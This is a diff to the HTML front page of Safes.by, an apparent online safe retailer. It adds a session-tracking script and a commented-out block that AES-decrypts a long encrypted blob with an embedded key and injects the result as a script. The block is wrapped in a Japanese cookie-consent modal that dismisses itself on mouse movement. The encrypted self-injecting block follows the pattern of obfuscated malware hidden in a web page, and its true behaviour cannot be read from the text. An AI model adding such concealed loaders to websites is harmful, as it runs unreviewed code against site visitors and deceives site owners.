@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+	<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=08ec21c1"></script>
 
 <head>
 	
@@ -69,6 +70,87 @@
 </head>
 
 <body>
+	 <!-- <script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">クッキーについて</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
+                をクリックすると、クッキーの使用に同意したことになります。
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>  -->
+
   <header>
     <h1>Safes.by</h1>
     <p>Looking to buy a safe? You’re in the right place!</p>
